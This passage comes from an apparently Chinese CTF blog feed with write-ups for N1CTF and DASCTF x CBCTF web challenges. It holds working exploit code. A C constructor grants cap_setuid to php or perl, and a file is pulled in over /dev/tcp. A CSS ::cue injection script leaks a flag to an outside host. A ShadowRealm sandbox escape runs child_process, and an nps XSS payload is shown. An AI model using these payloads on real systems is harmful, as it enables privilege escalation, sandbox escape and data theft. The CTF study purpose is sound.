class="line">```</span><br><span class="line">将编译出来的文件传到靶机（dd &lt; /dev/tcp/ip/port &gt; cap.so）  </span><br><span class="line">加载这个so让/bin/cat获取cap_dac_override（忽略文件权限）的特权  </span><br><span class="line">```</span><br><span class="line">mariadb --plugin-dir=. --<span class="keyword">default</span>-auth=cap</span><br><span class="line">cat /flag</span><br><span class="line">```</span><br></pre></td></tr></table></figure><h2 id="劫持-php"><span id="劫持-php"> 劫持 php</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;netinet/in.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/socket.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;dlfcn.h&gt;</span></span><br><span class="line"><span class="comment">// #include &lt;sys/capability.h&gt;</span></span><br><span class="line"></span><br><span class="line">typedef <span class="keyword">void</span>* cap_t;</span><br><span class="line">typedef <span class="title function_ invoke__">cap_t</span> (*cap_from_text_t)(<span class="keyword">const</span> char *);</span><br><span class="line">typedef <span class="keyword">int</span> (*cap_set_file_t)(<span class="keyword">const</span> <span class="variable constant_">char</span> *, cap_t);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__attribute__</span>((constructor)) <span class="keyword">void</span> <span class="title function_ invoke__">init</span>(<span class="keyword">int</span> argc, char *argv[]) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;cap.c: init()\n&quot;</span>);</span><br><span class="line">    <span class="keyword">void</span> *handle = <span class="title function_ invoke__">dlopen</span> (<span class="string">&quot;/lib/x86_64-linux-gnu/libcap.so.2&quot;</span>, RTLD_LAZY);</span><br><span class="line">    cap_from_text_t cap_from_text = (cap_from_text_t)<span class="title function_ invoke__">dlsym</span>(handle, <span class="string">&quot;cap_from_text&quot;</span>);</span><br><span class="line">    cap_set_file_t cap_set_file = (cap_set_file_t)<span class="title function_ invoke__">dlsym</span>(handle, <span class="string">&quot;cap_set_file&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">cap_set_file</span>(<span class="string">&quot;/usr/local/bin/php&quot;</span>, <span class="title function_ invoke__">cap_from_text</span>(<span class="string">&quot;cap_setuid+ep&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>更吊的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/capability.h&gt;</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">_init</span>()</span><br><span class="line">&#123;</span><br><span class="line">    cap_t caps = <span class="title function_ invoke__">cap_init</span>();</span><br><span class="line">    <span class="keyword">if</span> (caps == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">perror</span>(<span class="string">&quot;cap_init&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    cap_value_t cap_list[<span class="number">4</span>];</span><br><span class="line">    <span class="comment">//cap_list[0] = CAP_SYS_ADMIN;</span></span><br><span class="line">    cap_list[<span class="number">0</span>] = CAP_SETFCAP;</span><br><span class="line">    cap_list[<span class="number">1</span>] = CAP_CHOWN;</span><br><span class="line">    cap_list[<span class="number">2</span>] = CAP_SETUID;</span><br><span class="line">    cap_list[<span class="number">3</span>] = CAP_SETGID;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">cap_set_flag</span>(caps, CAP_EFFECTIVE, <span class="number">4</span>, cap_list, CAP_SET) == -<span class="number">1</span> ||</span><br><span class="line">        <span class="title function_ invoke__">cap_set_flag</span>(caps, CAP_INHERITABLE, <span class="number">4</span>, cap_list, CAP_SET) == -<span class="number">1</span> ||</span><br><span class="line">        <span class="title function_ invoke__">cap_set_flag</span>(caps, CAP_PERMITTED, <span class="number">4</span>, cap_list, CAP_SET) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">perror</span>(<span class="string">&quot;cap_set_flag&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">cap_free</span>(caps);</span><br><span class="line">        <span class="keyword">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">char</span> *filename = <span class="string">&quot;/tmp/perl&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">cap_set_file</span>(filename, caps) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">perror</span>(<span class="string">&quot;cap_set_file&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">cap_free</span>(caps);</span><br><span class="line">        <span class="keyword">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">cap_free</span>(caps);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699456844128.png" alt="1699456844128"></p><p>md😡其它几家的反弹 shellpayload 有问题，反弹 shell 了以后就一直连不上 mariadb 了，最后还是用了 lolita 的 exp 打，一遍过，果然 lolita 还是爱我的🥰🥰🥰.</p><p>这种终出的感觉谁懂啊，好√Ⅷ 舒服啊，√Ⅷ 好舒服啊.</p><h1 id="ytiruces"><span id="ytiruces"> ytiruces</span></h1><p>👴不想复现，环境不好搞，👴贴个 exp 在这</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import <span class="keyword">string</span></span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;https://ytiruces.ctfpunk.com/?content=%3Cp%3E%3Cstyle%3E#style#%3C/style%3E%3Cvideo%20controls%20playsinline%20autoplay%20muted%20loop%3E%3Csource%20src=%22https://n1s.ctf.hurrison.com/test.webm%22%3E%3Ctrack%20src=%22/flag?name=WEBVTT%250a00:00.000--%3E00:13.000%250a%3Cv%22%20default%3E&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;n1ctf&#123;I&#x27;</span></span><br><span class="line"></span><br><span class="line">style = <span class="string">&#x27;::cue(v[voice^=%22&#x27;</span> + flag + <span class="string">&#x27;#x#%22])%20&#123;%20background:%20url(https://n1.ctf.hurrison.com/?f=#x#);%20&#125;%0a&#x27;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">table = <span class="keyword">string</span>.ascii_letters + <span class="string">&#x27;&#123;&#x27;</span> + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x in table:</span><br><span class="line">    s += style.<span class="title function_ invoke__">replace</span>(<span class="string">&#x27;#x#&#x27;</span>, x)</span><br><span class="line"></span><br><span class="line">payload = payload.<span class="title function_ invoke__">replace</span>(<span class="string">&#x27;#style#&#x27;</span>, s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(payload)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;119.28.143.13&#x27;</span></span><br><span class="line">port = <span class="number">32890</span></span><br><span class="line"></span><br><span class="line">s = socket.<span class="title function_ invoke__">socket</span>(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.<span class="title function_ invoke__">connect</span>((ip, port))</span><br><span class="line">d = s.<span class="title function_ invoke__">recv</span>(<span class="number">256</span>)</span><br><span class="line"><span class="keyword">print</span>(d)</span><br><span class="line">s.<span class="title function_ invoke__">send</span>(payload.<span class="title function_ invoke__">encode</span>())</span><br></pre></td></tr></table></figure></li></ol><h1 id="ggbonds-gogs"><span id="ggbonds-gogs"> ggbond’s gogs</span></h1><p>👴真不是懒，没环境复现个钩子，tmd 当👴⭐😡吧.</p><h1 id="dockerdebug"><span id="dockerdebug"> dockerdebug</span></h1><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#FROM openjdk:8-alpine</span></span><br><span class="line"><span class="keyword">FROM</span> adoptopenjdk/openjdk11</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> SimpleAPI-1.0-SNAPSHOT.jar /tmp/web.jar</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag /flag</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> start.sh /start.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /start.sh</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> /start.sh </span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8877</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3345</span></span><br></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">touch /tmp/app.log</span><br><span class="line">chmod <span class="number">666</span> /tmp/app.log</span><br><span class="line"></span><br><span class="line">nohup java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:<span class="number">3345</span> -jar /tmp/web.jar &gt;/tmp/app.log</span><br></pre></td></tr></table></figure><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699318954586.png" alt="1699318954586"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8877:8877  -p 63342:63342 remote_debug</span><br></pre></td></tr></table></figure><p>运行远程连接 debug 专用的端口</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://1llustrious.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>DAS0RAYSXCBCTF</title>
    <link href="https://1llustrious.github.io/2023/11/30/DAS0RAYSXCBCTF/"/>
    <id>https://1llustrious.github.io/2023/11/30/DAS0RAYSXCBCTF/</id>
    <published>2023-11-30T08:12:36.000Z</published>
    <updated>2023-11-30T13:36:00.110Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- toc --><ul><li><a href="#das0raysxcbctf">DAS0RAYSxCBCTF</a></li><li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">写在前面</a></li><li><a href="#yet-another-box">yet another box</a><ul><li><a href="#stack-trace-api">Stack trace API</a></li><li><a href="#shadow-realm-api">Shadow-Realm-API</a></li><li><a href="#dynamic-import%E6%96%B9%E6%A1%88">dynamic import 方案</a></li><li><a href="#exp">exp</a></li></ul></li><li><a href="#nps">nps</a><ul><li><a href="#%E5%BC%80%E6%89%93">开打😓</a></li><li><a href="#remote%E5%B9%B2">remote 干🤪</a><ul><li><a href="#%E5%BF%86%E6%82%9F%E8%BF%99%E5%B0%B1%E6%98%AFxss%E7%9A%84%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%88%9B%E9%80%A0">忆！悟！这就是 xss 的机器人创造</a></li><li><a href="#exp-1">exp</a></li></ul></li></ul></li><li><a href="#deserializeupload">Deserialize?Upload!</a><ul><li><a href="#actuator">actuator😫</a></li><li><a href="#%E9%A2%98%E7%9B%AE%E5%AE%9E%E8%B7%B5">题目实践😓😡</a></li><li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90">反序列化分析😛</a></li><li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%84%E5%90%88%E6%8B%B3">文件上传 + 反序列化组合拳😤</a></li></ul></li><li><a href="#dasctfxcbctf_2023_bypassjava">DASCTFXCBCTF_2023_bypassJava</a><ul><li><a href="#content-length%E9%99%90%E5%88%B6">Content-Length 限制</a></li><li><a href="#chuncked%E7%BC%96%E7%A0%81%E6%80%8E%E4%B9%88%E5%8F%91">chuncked 编码怎么发</a></li><li><a href="#%E4%B8%8D%E7%A8%B3%E5%AE%9Ajackson%E9%93%BE%E9%97%AE%E9%A2%98">不稳定 jackson 链问题</a><ul><li><a href="#%E6%B5%81%E7%A8%8B">流程</a></li><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%A1%BA%E5%BA%8F%E4%B8%8D%E4%B8%80%E5%AE%9A">为什么顺序不一定</a></li><li><a href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95">解决方法😊</a><ul><li><a href="#%E5%AE%9E%E7%8E%B0">实现</a></li></ul></li><li><a href="#%E6%9E%84%E9%80%A0">构造</a></li></ul></li><li><a href="#%E5%86%85%E5%AD%98%E7%9A%84%E4%BD%BF%E7%94%A8">内存🐎的使用🥵👴</a><ul><li><a href="#%E5%88%97%E7%9B%AE%E5%BD%95">列目录</a></li><li><a href="#%E8%AF%BB%E6%96%87%E4%BB%B6">读文件</a></li></ul></li><li><a href="#rasp">RASP😅😡</a><ul><li><a href="#%E5%95%A5%E4%BA%8Brasp">啥事 RASP</a></li></ul></li><li><a href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88">解决方案😒</a><ul><li><a href="#jni%E8%A7%84%E8%8C%83">JNI 规范</a></li></ul></li></ul></li></ul><!-- tocstop --><h1 id="das0raysxcbctf"><span id="das0raysxcbctf"> DAS0RAYSxCBCTF</span></h1><h1 id="写在前面"><span id="写在前面"> 写在前面</span></h1><p>wcsnmd, 谁给👴出的这么恶心的 web,nmd 爆零了，tmd 总共 3100 的解，什么√⑧玩意儿.</p><p>wp:<a href="https://test-cuycc6s9lprw.feishu.cn/docx/T7budbiSWoTNd4xQGVicHL1Vnpf">‌‍﻿⁡﻿⁣‌‍﻿‍⁣⁢⁢﻿‌‍‬﻿⁣﻿‌⁣⁢‌⁡⁤⁢⁤⁤‌‌⁡⁢‌‍﻿⁣‌‌⁡⁣﻿﻿DASCTF x CBCTF - 飞书云文档 (feishu.cn)</a></p><p><a href="https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/">DASCTFXCBCTF_2023_bypassJava_Wp (pankas.top)</a></p><h1 id="yet-another-box"><span id="yet-another-box"> yet another box</span></h1><p>这题是一个比较新的沙箱 <code>shadowrealm</code> , 这 byd 和 node 的 vm8 太一样，有着自己的全局对象和内置函数，就挺抽象，没法像 <code>vm</code> , 也无法通过 <code>prototype pollution</code>  控制主模块中的内置属性另外由于与 package.json 声明了 “type”:“module” 且文件结尾为 .mjs，所采用的 ESM 默认 strict mode，无法通过 [stack-trace-api](<a href="https://v8.dev/docs/stack-trace-api#customizing-stack-traces">Stack trace API・V8 — 堆栈跟踪 API・V8 发动机</a>) 跨上下文取得可利用对象。</p><h2 id="stack-trace-api"><span id="stack-trace-api"> Stack trace API</span></h2><p>仅作为学习记录使用，并不为本题提供思路.</p><p>默认情况下，V8 抛出的几乎所有错误都有一个属性，抛出错误的时候会用到方法，该方法能获得到外面的全局对象.</p><h2 id="shadow-realm-api"><span id="shadow-realm-api"> Shadow-Realm-API</span></h2><p><code>Wrapped Function Exotic Objects</code>  是一种奇异对象，内含一个回调函数。具有一些内置槽 <code>slot</code> ,:</p><table><thead><tr><th style="text-align:center">Internal slots</th><th style="text-align:center">Type</th><th style="text-align:center"><strong>Description</strong></th></tr></thead><tbody><tr><td style="text-align:center">[[WrappedTargetFunction]]</td><td style="text-align:center">Callable Object</td><td style="text-align:center">Stores the callable object.</td></tr><tr><td style="text-align:center">[[Call]]</td><td style="text-align:center">The [[Call]] internal method</td><td style="text-align:center">Executes code associated with this object’s [[WrappedTargetFunction]].</td></tr><tr><td style="text-align:center">[[Realm]]</td><td style="text-align:center"><a href="https://tc39.es/ecma262/#realm-record"> Realm Record</a></td><td style="text-align:center">The <a href="https://tc39.es/ecma262/#realm">realm</a> in which the function was created.</td></tr></tbody></table><p>还有 [[Prototype]] and [[Extensible]]</p><p>对象的 [[call]] 方法获取两个参数:thisArgument, argumentsList . 调用时会实现以下步骤:</p><p>1. 设置运行代码的上下文。执行上下文通常包括执行函数的作用域、变量、this 值等信息。</p><p>2. 设置新的作用域 calleecontext.</p><p>3. 执行 assert 断言，确保 calleecontext 是目前正在执行的上下文.</p><p>4. 用 result 储存 **OrdinaryWrappedFunctionCall (F, thisArgument, argumentsList)** 的运行结果</p><p>5.calleeContext 被从执行上下文栈中移除，而 callerContext 被恢复为当前运行的执行上下文。</p><p>6. 判断返回类型，如果 [[TYPE]] 已返回，则返回 value.</p><p>7. 处理异常</p><p>8. 执行结束.</p><h2 id="dynamic-import-方案"><span id="dynamic-import-方案"> dynamic import 方案</span></h2><p>通过动态 import 允许我们按需加载 JavaScript 模块，而不会在最开始的时候就将全部模块加载。</p><p>动态 import 返回了一个 Promise 对象，这也意味着可以在 then 中等模块加载成功后去做一些操作。</p><p>所以 import 导入需要通过 then 去触发其方法.</p><p>import 在执行方法后仍然是 promise 对象，采用的类似于链式调用.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var test = <span class="keyword">import</span>(<span class="string">&quot;child_process&quot;</span>).then(m=&gt;console.log(m))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中 test 获取 promise 异步对象，而 m 直接就获得 child_process 对象.</p><h2 id="exp"><span id="exp"> exp</span></h2><p>简而言之</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ShadowRealm.prototype.evaluate =&gt; PerformShadowRealmEval =&gt; Execution Contexts</span><br></pre></td></tr></table></figure><p>支持 dynamic import</p><p>“Dynamic import” 是指在 JavaScript 中动态加载模块或文件的能力。这是 ECMAScript 2020 标准的一部分，引入了 import () 函数，它可以在运行时异步加载模块。这与传统的静态 import 语句不同，后者在代码加载时即确定了要导入的模块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>(<span class="string">&#x27;child_process&#x27;</span>).then(m=&gt;m.execSync(<span class="string">&#x27;/readflag &gt; /app/asserts/flag&#x27;</span>));</span><br><span class="line"><span class="number">1</span>;</span><br></pre></td></tr></table></figure><h1 id="nps"><span id="nps"> nps</span></h1><p>md 又是 xss,👴又 tnnd 不会，しね！</p><p>🧀一个 nps 网站上的 xss. 涉及<a href="https://blog.carrot2.cn/2023/10/nps2.html"> CVE-2023-46486</a></p><p><a href="https://github.com/ehang-io/nps/releases/tag/v0.26.10">项目地址</a></p><p>影响范围:</p><p>nps&lt;=V0.26.10</p><p>你 tm 搁这放屁呢，最新版本就是这个，21 年最后 publish 了.</p><p>漏洞怎么个事:</p><p><code>bootstrapTable</code>  并未配置 <code>escape</code>  字段，且使用时不改默认配置</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101223246.png" alt="微信截图_20231101223246"></p><p>kokodayo,web/views/client/list.html</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101223529.png" alt="微信截图_20231101223529"></p><p>这里设置公钥，防止被 ntr (被别人用代理), 你也不希望你拿不到 shell 吧 (bushi)</p><p>同为代理，经常被提起的 frp 和 venom 都没太注意公钥，实际上是有公钥这一选项的.</p><p>这里，我们完全就能够通过客户端去进行攻击了.</p><h2 id="开打"><span id="开打"> 开打😓</span></h2><p>cnm,sbwindows, 死活用不成，linux 一下就出来了和👴😡了</p><p>√⑧玩意，当👴⭐😡吧</p><p>首先下载客户端，这一点和 frp 的 admin 端和 agent 端类似</p><p>然后配置客户端的配置文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8024</span></span><br><span class="line">conn_type=tcp</span><br><span class="line">vkey=<span class="number">123</span></span><br><span class="line">remark=&lt;sCRiPt&gt;alert(`nps hacker`)&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101224733.png" alt="微信截图_20231101224733"></p><p>× 成功了，狠狠地 × 进去</p><h2 id="remote-干"><span id="remote-干"> remote 干🤪</span></h2><h3 id="忆悟这就是-xss-的机器人创造"><span id="忆悟这就是-xss-的机器人创造"> 忆！悟！这就是 xss 的机器人创造</span></h3><p>首先题目通过 js 代码造了个后台机器人，👴很喜欢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;chromium, errors&#125; <span class="keyword">from</span> <span class="string">&quot;playwright-chromium&quot;</span>;</span><br><span class="line"></span><br><span class="line">const PASSWORD = <span class="string">&quot;DASCTF_flag&quot;</span>;</span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">async</span> function visit() &#123;</span><br><span class="line">        const page = <span class="keyword">await</span> context.newPage();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="keyword">await</span> page.goto(<span class="string">&#x27;http://a.o.com:8080/client/list&#x27;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;catch (e) &#123;</span><br><span class="line">                    console.log(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            const element = <span class="keyword">await</span> page.isVisible(<span class="string">&#x27;button[langtag=&quot;word-login&quot;]&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (element) &#123;</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;username&quot;]&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;password&quot;]&#x27;</span>, PASSWORD);</span><br><span class="line">                <span class="keyword">await</span> page.click(<span class="string">&#x27;button[langtag=&quot;word-login&quot;]&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">await</span> page.close();</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e instanceof errors.TimeoutError)&#123;</span><br><span class="line">                console.log(e);</span><br><span class="line">                <span class="keyword">await</span> page.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                console.log(e);</span><br><span class="line">            &#125;     </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    const browser = <span class="keyword">await</span> chromium.launch(&#123;</span><br><span class="line">        headless: true</span><br><span class="line">    &#125;);</span><br><span class="line">    const context = <span class="keyword">await</span> browser.newContext();</span><br><span class="line">    context.setDefaultTimeout(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line">    setInterval(visit, <span class="number">30000</span>);</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看不懂没关系，👴来带你分析一下.</p><p>首先整个就是一坨 shit⛰,</p><p>通过一个箭头函数 () 的方式立即调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const browser = <span class="keyword">await</span> chromium.launch(&#123;</span><br><span class="line">        headless: true</span><br><span class="line">    &#125;);</span><br><span class="line">    const context = <span class="keyword">await</span> browser.newContext();</span><br><span class="line">    context.setDefaultTimeout(<span class="number">10000</span>);</span><br><span class="line">    setInterval(visit, <span class="number">30000</span>);</span><br></pre></td></tr></table></figure><p>首先创建一个浏览器和上下文，然后设置 setIneterval, 表示每三十秒调用 visit, 函数，让👴看看 visit 函数怎么个事</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">async</span> function visit() &#123;</span><br><span class="line">        const page = <span class="keyword">await</span> context.newPage();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="keyword">await</span> page.goto(<span 